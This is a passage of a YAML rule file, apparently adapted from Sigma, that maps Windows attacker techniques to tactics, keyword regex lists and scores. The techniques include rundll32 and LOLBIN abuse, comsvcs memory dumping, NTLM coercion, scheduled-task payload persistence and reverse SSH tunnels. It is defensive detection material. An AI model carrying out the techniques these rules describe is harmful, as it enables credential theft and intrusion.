    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_65c3ca2c_525f_4ced_968e_246a713d164f
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects renamed execution of "Microsoft.NodejsTools.PressAnyKey.exe",
    which can be abused as a LOLBIN to execute arbitrary binaries
  conditions:
    summary:
      regex_any:
      - visual
      - studio
      - nodejstools
      - pressanykey
      - renamed
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2569ed8c_1147_498a_9b8c_2ad3656b10ed
  intent: execution
  tactic: execution
  description: Detects when 'DllRegisterServer' is called in the commandline and the
    image is not rundll32. This could mean that the 'rundll32' utility has been renamed
    in order to avoid detection
  conditions:
    summary:
      regex_any:
      - potential
      - renamed
      - rundll32
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cd764533_2e07_40d6_a718_cfeec7f2da7f
  intent: unknown
  tactic: resource_development
  description: Detects suspicious renamed SysInternals DebugView execution
  conditions:
    summary:
      regex_any:
      - renamed
      - sysinternals
      - debugview
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4a0b2c7e_7cb2_495d_8b63_5f268e7bfd67
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of a renamed ProcDump executable.

    This often done by attackers or malware in order to evade defensive mechanisms.

    '
  conditions:
    summary:
      regex_any:
      - renamed
      - procdump
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_51ae86a2_e2e1_4097_ad85_c46cb6851de4
  intent: execution
  tactic: execution
  description: Detects suspicious launch of a renamed version of the PSEXESVC service
    with, which is not often used by legitimate administrators
  conditions:
    summary:
      regex_any:
      - renamed
      - psexec
      - service
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c1d867fe_8d95_4487_aab4_e53f2d339f90
  intent: impact_operations
  tactic: impact
  description: Detects the use of a renamed SysInternals Sdelete, which is something
    an administrator shouldn't do (the renaming)
  conditions:
    summary:
      regex_any:
      - renamed
      - sysinternals
      - sdelete
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7b4f794b_590a_4ad4_ba18_7964a2832205
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects renamed vmnat.exe or portable version that can be used for
    DLL side-loading
  conditions:
    summary:
      regex_any:
      - renamed
      - vmnat
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f1086bf7_a0c4_4a37_9102_01e573caf4a0
  intent: reconnaissance
  tactic: discovery
  description: Detects the execution of whoami that has been renamed to a different
    name to avoid detection
  conditions:
    summary:
      regex_any:
      - renamed
      - whoami
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_93671f99_04eb_4ab4_a161_70d446a84003
  intent: credential_harvesting
  tactic: credential_access
  description: Detects using Rpcping.exe to send a RPC test connection to the target
    server (-s) and force the NTLM hash to be sent in the process.
  conditions:
    summary:
      regex_any:
      - capture
      - credentials
      - with
      - rpcping
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_20a5ffa1_3848_4584_b6f8_c7c7fd9f69c8
  intent: execution
  tactic: execution
  description: Detects execution of ruby using the "-e" flag. This is could be used
    as a way to launch a reverse shell or execute live ruby code.
  conditions:
    summary:
      regex_any:
      - ruby
      - inline
      - command
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9248c7e1_2bf3_4661_a22c_600a8040b446
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of rundll32 where the DLL being called is stored
    in an Alternate Data Stream (ADS).
  conditions:
    summary:
      regex_any:
      - potential
      - rundll32
      - execution
      - with
      - stored
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a1473adb_5338_4a20_b4c3_126763e2d3d3
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of "rundll32" calling "advpack.dll" with potential
    obfuscated ordinal calls in order to leverage the "RegisterOCX" function
  conditions:
    summary:
      regex_any:
      - suspicious
      - advpack
      - call
      - rundll32
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1cc50f3f_1fc8_4acf_b2e9_6f172e1fdebd
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious process related to rundll32 based on command line
    that invokes inline VBScript as seen being used by UNC2452
  conditions:
    summary:
      regex_any:
      - suspicious
      - rundll32
      - invoking
      - inline
      - vbscript
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_15bd98ea_55f4_4d37_b09a_e7caa0fa2221
  intent: defense_evasion
  tactic: defense_evasion
  description: An attacker may execute an application as a SCR File using rundll32.exe
    desk.cpl,InstallScreenSaver
  conditions:
    summary:
      regex_any:
      - rundll32
      - installscreensaver
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a4694263_59a8_4608_a3a0_6f8d3a51664c
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the invocation of the Stored User Names and Passwords dialogue
    (Key Manager)
  conditions:
    summary:
      regex_any:
      - suspicious
      - manager
      - access
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4782eb5a_a513_4523_a0ac_f3082b26ac5c
  intent: execution
  tactic: execution
  description: 'Detects execution of commands that leverage the "mshtml.dll" RunHTMLApplication
    export to run arbitrary code via different protocol handlers (vbscript, javascript,
    file, http...)

    '
  conditions:
    summary:
      regex_any:
      - mshtml
      - runhtmlapplication
      - suspicious
      - usage
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1775e15e_b61b_4d14_a1a3_80981298085a
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious start of rundll32.exe without any parameters as
    found in CobaltStrike beacon activity
  conditions:
    summary:
      regex_any:
      - rundll32
      - execution
      - without
      - commandline
      - parameters
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bb76d96b_821c_47cf_944b_7ce377864492
  intent: credential_harvesting
  tactic: credential_access
  description: Detects a privilege elevation attempt by coercing NTLM authentication
    on the Printer Spooler service
  conditions:
    summary:
      regex_any:
      - suspicious
      - ntlm
      - authentication
      - printer
      - spooler
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_43fa5350_db63_4b8f_9a01_789a427074e1
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of "rundll32" with potential obfuscated ordinal calls
  conditions:
    summary:
      regex_any:
      - potential
      - obfuscated
      - ordinal
      - call
      - rundll32
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1723e720_616d_4ddc_ab02_f7e3685a4713
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of "rundll32.exe" with a parent process of Explorer.exe.
    This has been observed by variants of Raspberry Robin, as first reported by Red
    Canary.
  conditions:
    summary:
      regex_any:
      - rundll32
      - spawned
      - explorer
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_646ea171_dded_4578_8a4d_65e9822892e3
  intent: credential_harvesting
  tactic: credential_access
  description: Detects a process memory dump via "comsvcs.dll" using rundll32, covering
    multiple different techniques (ordinal, minidump function, etc.)
  conditions:
    summary:
      regex_any:
      - process
      - memory
      - dump
      - comsvcs
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f1edd233_30b5_4823_9e6a_c4171b24d316
  intent: persistence_installation
  tactic: persistence
  description: load malicious registered COM objects
  conditions:
    summary:
      regex_any:
      - rundll32
      - registered
      - objects
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_15b75071_74cc_47e0_b4c6_b43744a62a2b
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious process run from unusual locations
  conditions:
    summary:
      regex_any:
      - suspicious
      - process
      - start
      - locations
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_285b85b1_a555_4095_8652_a8a4106af63f
  intent: defense_evasion
  tactic: defense_evasion
  description: setupapi.dll library provide InstallHinfSection function for processing
    INF files. INF file may contain instructions allowing to create values in the
    registry, modify files and install drivers. This technique could be used to obtain
    persistence via modifying one of Run or RunOnce registry keys, run process or
    use other DLLs chain calls (see references) InstallHinfSection function in setupapi.dll
    calls runonce.exe executable regardless of actual content of INF file.
  conditions:
    summary:
      regex_any:
      - suspicious
      - rundll32
      - setupapi
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_32b96012_7892_429e_b26c_ac2bf46066ff
  intent: execution
  tactic: execution
  description: Detects shell32.dll executing a DLL in a suspicious directory
  conditions:
    summary:
      regex_any:
      - shell32
      - execution
      - suspicious
      - directory
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_82343930_652f_43f5_ab70_2ee9fdd6d5e9
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potential "ShellDispatch.dll" functionality abuse to execute
    arbitrary binaries via "ShellExecute"
  conditions:
    summary:
      regex_any:
      - potential
      - shelldispatch
      - functionality
      - abuse
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_caa06de8_fdef_4c91_826a_7f9e163eef4b
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects RunDLL32.exe spawning explorer.exe as child, which is very
    uncommon, often observes Gamarue spawning the explorer.exe process in an unusual
    way
  conditions:
    summary:
      regex_any:
      - rundll32
      - spawning
      - explorer
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e593cf51_88db_4ee1_b920_37e89012a3c9
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious execution of rundll32, with specific calls to some
    DLLs with known LOLBIN functionalities
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - rundll32
      - activity
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d7eb979b_c2b5_4a6f_a3a7_c87ce6763819
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious Rundll32 execution from control.exe as used by Equation
    Group and Exploit Kits
  conditions:
    summary:
      regex_any:
      - suspicious
      - control
      - panel
      - load
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4aa6040b_3f28_44e3_a769_9208e5feb5ec
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of Rundll32.exe with DLL files masquerading as
    image files
  conditions:
    summary:
      regex_any:
      - suspicious
      - rundll32
      - execution
      - with
      - image
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d87bd452_6da1_456e_8155_7dc988157b7d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious usage of the ShellExec_RunDLL function to launch
    other commands as seen in the the raspberry-robin attack
  conditions:
    summary:
      regex_any:
      - suspicious
      - usage
      - shellexec_rundll
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8823e85d_31d8_473e_b7f4_92da070f0fc6
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects suspicious call to the "ShellExec_RunDLL" exported function
    of SHELL32.DLL through the ordinal number to launch other commands.

    Adversary might only use the ordinal number in order to bypass existing detection
    that alert on usage of ShellExec_RunDLL on CommandLine.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - shellexec_rundll
      - call
      - ordinal
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b0524451_19af_4efa_a46f_562a977f792e
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects actions that clear the local ShimCache and remove forensic
    evidence
  conditions:
    summary:
      regex_any:
      - shimcache
      - flush
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_731231b9_0b5d_4219_94dd_abb6959aa7ea
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious process related to rundll32 based on command line
    that includes a *.sys file as seen being used by UNC2452
  conditions:
    summary:
      regex_any:
      - suspicious
      - rundll32
      - activity
      - invoking
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0ea52357_cd59_4340_9981_c46c7e900428
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects the execution of rundll32.exe with the oledb32.dll library
    to open a UDL file.

    Threat actors can abuse this technique as a phishing vector to capture authentication
    credentials or other sensitive data.

    '
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - rundll32
      - execution
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c3a99af4_35a9_4668_879e_c09aeb4f2bdf
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of rundll32 with a command line that doesn't
    contain a common extension
  conditions:
    summary:
      regex_any:
      - rundll32
      - execution
      - with
      - uncommon
      - extension
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5cdb711b_5740_4fb2_ba88_f7945027afac
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects rundll32 execution where the DLL is located on a remote location
    (share)
  conditions:
    summary:
      regex_any:
      - rundll32
      - path
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3b5b0213_0460_4e3f_8937_3abf98ff7dcc
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects a suspicious call to the user32.dll function that locks the
    user workstation
  conditions:
    summary:
      regex_any:
      - suspicious
      - workstation
      - locking
      - rundll32
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2dbd9d3d_9e27_42a8_b8df_f13825c6c3d5
  intent: data_exfiltration
  tactic: exfiltration
  description: 'Detects "svchost.exe" spawning "rundll32.exe" with command arguments
    like "C:\windows\system32\davclnt.dll,DavSetCookie".

    This could be an indicator of exfiltration or use of WebDav to launch code (hosted
    on a WebDav server).

    '
  conditions:
    summary:
      regex_any:
      - webdav
      - client
      - execution
      - rundll32
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_982e9f2d_1a85_4d5b_aea4_31f5e97c6555
  intent: data_exfiltration
  tactic: exfiltration
  description: 'Detects "svchost.exe" spawning "rundll32.exe" with command arguments
    like C:\windows\system32\davclnt.dll,DavSetCookie. This could be an indicator
    of exfiltration or use of WebDav to launch code (hosted on WebDav Server) or potentially
    a sign of exploitation of CVE-2023-23397

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - webdav
      - client
      - execution
      - rundll32
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5bb68627_3198_40ca_b458_49f973db8752
  intent: execution
  tactic: execution
  description: Detects rundll32 execution without parameters as observed when running
    Metasploit windows/smb/psexec exploit module
  conditions:
    summary:
      regex_any:
      - rundll32
      - execution
      - without
      - parameters
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c5c00f49_b3f9_45a6_997e_cfdecc6e1967
  intent: persistence_installation
  tactic: persistence
  description: Detects the creation of a schtask that executes a file from C:\Users\<USER>\AppData\Local
  conditions:
    summary:
      regex_any:
      - suspicious
      - schtasks
      - execution
      - appdata
      - folder
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1c0e41cd_21bb_4433_9acc_4a2cd6367b9b
  intent: execution
  tactic: execution
  description: 'Detects when an attacker tries to modify an already existing scheduled
    tasks to run from a suspicious location

    Attackers can create a simple looking task in order to avoid detection on creation
    as it''s often the most focused on

    Instead they modify the task after creation to include their malicious payload

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - modification
      - scheduled
      - tasks
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_39019a4e_317f_4ce3_ae63_309a8c6b53c5
  intent: persistence_installation
  tactic: persistence
  description: Detects the creation of scheduled tasks that involves a temporary folder
    and runs only once
  conditions:
    summary:
      regex_any:
      - suspicious
      - scheduled
      - task
      - creation
      - involving
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1d174d38_8fda_4081_a9b6_56d9763c0cd8
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects the creation of a scheduled task using schtasks.exe, potentially
    in combination with curl for downloading payloads and PowerShell for executing
    them.

    This facilitates executing malicious payloads or connecting with C&C server persistently
    without dropping the malware sample on the host.

    '
  conditions:
    summary:
      regex_any:
      - scheduled
      - task
      - creation
      - with
      - curl
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_dbc1f800_0fe0_4bc0_9c66_292c2abe3f78
  intent: impact_operations
  tactic: impact
  description: Detects when adversaries stop services or processes by deleting their
    respective scheduled tasks in order to conduct data destructive activities
  conditions:
    summary:
      regex_any:
      - delete
      - important
      - scheduled
      - task
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_220457c1_1c9f_4c2e_afe6_9598926222c1
  intent: impact_operations
  tactic: impact
  description: Detects the usage of schtasks with the delete flag and the asterisk
    symbol to delete all tasks from the schedule of the local computer, including
    tasks scheduled by other users.
  conditions:
    summary:
      regex_any:
      - delete
      - scheduled
      - tasks
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9ac94dc8_9042_493c_ba45_3b5e7c86b980
  intent: impact_operations
  tactic: impact
  description: Detects when adversaries stop services or processes by disabling their
    respective scheduled tasks in order to conduct data destructive activities
  conditions:
    summary:
      regex_any:
      - disable
      - important
      - scheduled
      - task
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_81325ce1_be01_4250_944f_b4789644556f
  intent: execution
  tactic: execution
  description: Detects Schtask creations that point to a suspicious folder or an environment
    variable often used by malware
  conditions:
    summary:
      regex_any:
      - schedule
      - task
      - creation
      - from
      - variable
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8a8379b8_780b_4dbf_b1e9_31c8d112fefb
  intent: execution
  tactic: execution
  description: Detects scheduled task creations that have suspicious action command
    and folder combinations
  conditions:
    summary:
      regex_any:
      - schtasks
      - from
      - suspicious
      - folders
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ff2fff64_4cd6_4a2b_ba7d_e28a30bbe66b
  intent: execution
  tactic: execution
  description: Detects creation of a scheduled task with a GUID like name
  conditions:
    summary:
      regex_any:
      - suspicious
      - scheduled
      - task
      - name
      - guid
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_970823b7_273b_460a_8afc_3a6811998529
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects scheduled task creation events that include suspicious actions,
    and is run once at 00:00
  conditions:
    summary:
      regex_any:
      - uncommon
      - time
      - only
      - scheduled
      - task
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2daa93a0_a5fb_41c5_8cd8_3c11294bfd1f
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the creation of new scheduled tasks via commandline, using
    Schtasks.exe. This rule detects tasks creating that call OpenSSH, which may indicate
    the creation of reverse SSH tunnel to the attacker's server.
  conditions:
    summary:
      regex_any:
      - potential
      - tunnel
      - persistence
      - install
      - using
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f548a603_c9f2_4c89_b511_b089f7e94549
  intent: persistence_installation
  tactic: persistence
  description: 'Detects manual execution of the "Microsoft Compatibility Appraiser"
    task via schtasks.

    In order to trigger persistence stored in the "\AppCompatFlags\TelemetryController"
    registry key.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - microsoft
      - compatibility
      - appraiser
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b66474aa_bd92_4333_a16c_298155b120df
  intent: persistence_installation
  tactic: persistence
  description: Detects suspicious powershell execution via a schedule task where the
    command ends with an suspicious flags to hide the powershell instance instead
    of executeing scripts or commands. This could be a sign of persistence via PowerShell
    "Get-Variable" technique as seen being used in Colibri Loader
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - powershell
      - search
      - order
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_86588b36_c6d3_465f_9cee_8f9093e07798
  intent: persistence_installation
  tactic: persistence
  description: Detects the creation of a schtasks that potentially executes a payload
    stored in the Windows Registry using PowerShell.
  conditions:
    summary:
      regex_any:
      - scheduled
      - task
      - executing
      - payload
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c4eeeeae_89f4_43a7_8b48_8d1bdfa66c78
  intent: persistence_installation
  tactic: persistence
  description: Detects the creation of a schtask that potentially executes a base64
    encoded payload stored in the Windows Registry using PowerShell.
  conditions:
    summary:
      regex_any:
      - scheduled
      - task
      - executing
      - encoded
      - payload
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_24c8392b_aa3c_46b7_a545_43f71657fe98
  intent: execution
  tactic: execution
  description: Detects scheduled task creations or modification on a suspicious schedule
    type
  conditions:
    summary:
      regex_any:
      - suspicious
      - schtasks
      - schedule
      - types
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7a02e22e_b885_4404_b38b_1ddc7e65258a
  intent: execution
  tactic: execution
  description: Detects scheduled task creations or modification to be run with high
    privileges on a suspicious schedule type
  conditions:
    summary:
      regex_any:
      - suspicious
      - schtasks
      - schedule
      - type
      - with
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_dd2a821e_3b07_4d3b_a9ac_929fe4c6ca0c
  intent: persistence_installation
  tactic: persistence
  description: Detects the creation of a scheduled task using the "-XML" flag with
    a file without the '.xml' extension. This behavior could be indicative of potential
    defense evasion attempt during persistence
  conditions:
    summary:
      regex_any:
      - suspicious
      - scheduled
      - task
      - creation
      - masqueraded
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f2c64357_b1d2_41b7_849f_34d2682c0fad
  intent: execution
  tactic: execution
  description: Detects scheduled task creation using "schtasks" that contain potentially
    suspicious or uncommon commands
  conditions:
    summary:
      regex_any:
      - suspicious
      - command
      - patterns
      - scheduled
      - task
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_89ca78fd_b37c_4310_b3d3_81a023f83936
  intent: persistence_installation
  tactic: persistence
  description: Detects the creation or update of a scheduled task to run with "NT
    AUTHORITY\SYSTEM" privileges
  conditions:
    summary:
      regex_any:
      - schtasks
      - creation
      - modification
      - with
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9f8573c9_22b4_40e3_89c1_72bc2b8d49ab
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the creation of scheduled tasks that involve system processes,
    which may indicate malicious actors masquerading as or abusing these processes
    to execute payloads or maintain persistence.
  conditions:
    summary:
      regex_any:
      - scheduled
      - task
      - creation
      - masquerading
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f6d1dd2f_b8ce_40ca_bc23_062efb686b34
  intent: execution
  tactic: execution
  description: Detects a suspicious child process of Script Event Consumer (scrcons.exe).
  conditions:
    summary:
      regex_any:
      - script
      - event
      - consumer
      - spawning
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d937b75f_a665_4480_88a5_2f20e9f9b22a
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detection of sc.exe utility spawning by user with Medium integrity
    level to change service ImagePath or FailureCommand
  conditions:
    summary:
      regex_any:
      - possible
      - privilege
      - escalation
      - weak
      - service
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_85c312b7_f44d_4a51_a024_d671c40b49fc
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect the use of "sc.exe" to change the startup type of a service
    to "disabled" or "demand"
  conditions:
    summary:
      regex_any:
      - service
      - startuptype
      - change
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_431a1fdb_4799_4f3b_91c3_a683b003fc49
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects creation of a new service (kernel driver) with the type "kernel"
  conditions:
    summary:
      regex_any:
      - kernel
      - driver
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6c8fbee5_dee8_49bc_851d_c3142d02aa47
  intent: persistence_installation
  tactic: persistence
  description: Detects suspicious DACL modifications to allow access to a service
    from a suspicious trustee. This can be used to override access restrictions set
    by previous ACLs.
  conditions:
    summary:
      regex_any:
      - allow
      - service
      - access
      - using
      - security
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_99cf1e02_00fb_4c0d_8375_563f978dfd37
  intent: persistence_installation
  tactic: persistence
  description: Detects suspicious DACL modifications to deny access to a service that
    affects critical trustees. This can be used to hide services or make them unstoppable.
  conditions:
    summary:
      regex_any:
      - deny
      - service
      - access
      - using
      - security
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a537cfc3_4297_4789_92b5_345bfd845ad0
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects usage of the "sc.exe" utility adding a new service with special
    permission seen used by threat actors which makes the service hidden and unremovable.
  conditions:
    summary:
      regex_any:
      - service
      - dacl
      - abuse
      - hide
      - services
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_98c5aeef_32d5_492f_b174_64a691896d25
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detection of sc.exe utility adding a new service with special permission
    which hides that service.
  conditions:
    summary:
      regex_any:
      - service
      - security
      - descriptor
      - tampering
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_138d3531_8793_4f50_a2cd_f291b2863d78
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects service path modification via the "sc" binary to a suspicious
    command or path
  conditions:
    summary:
      regex_any:
      - suspicious
      - service
      - path
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_38879043_7e1e_47a9_8d46_6bec88e201df
  intent: persistence_installation
  tactic: persistence
  description: Detects the modification of an existing service in order to execute
    an arbitrary payload when the service is started or killed as a potential method
    for persistence.
  conditions:
    summary:
      regex_any:
      - potential
      - persistence
      - attempt
      - existing
      - service
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_517490a7_115a_48c6_8862_1a481504d5a8
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects installation of a new shim using sdbinst.exe.

    Adversaries may establish persistence and/or elevate privileges by executing malicious
    content triggered by application shims

    '
  conditions:
    summary:
      regex_any:
      - potential
      - shim
      - database
      - persistence
      - sdbinst
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_18ee686c_38a3_4f65_9f44_48a077141f42
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects installation of a potentially suspicious new shim with an
    uncommon extension using sdbinst.exe.

    Adversaries may establish persistence and/or elevate privileges by executing malicious
    content triggered by application shims

    '
  conditions:
    summary:
      regex_any:
      - uncommon
      - extension
      - shim
      - database
      - installation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_da2738f2_fadb_4394_afa7_0a0674885afa
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: A General detection for sdclt spawning new processes. This could be
    an indicator of sdclt being used for bypass UAC techniques.
  conditions:
    summary:
      regex_any:
      - sdclt
      - child
      - processes
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f3d39c45_de1a_4486_a687_ab126124f744
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects sdiagnhost.exe calling a suspicious child process (e.g. used
    in exploits for Follina / CVE-2022-30190)
  conditions:
    summary:
      regex_any:
      - sdiagnhost
      - calling
      - suspicious
      - child
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c2c76b77_32be_4d1f_82c9_7e544bdfe0eb
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential suspicious behaviour using secedit.exe. Such as exporting
    or modifying the security policy
  conditions:
    summary:
      regex_any:
      - potential
      - suspicious
      - activity
      - using
      - secedit
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_58f4ea09_0fc2_4520_ba18_b85c540b0eaf
  intent: credential_harvesting
  tactic: credential_access
  description: Detects a suspicious process pattern which could be a sign of an exploited
    Serv-U service
  conditions:
    summary:
      regex_any:
      - suspicious
      - serv
      - process
      - pattern
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
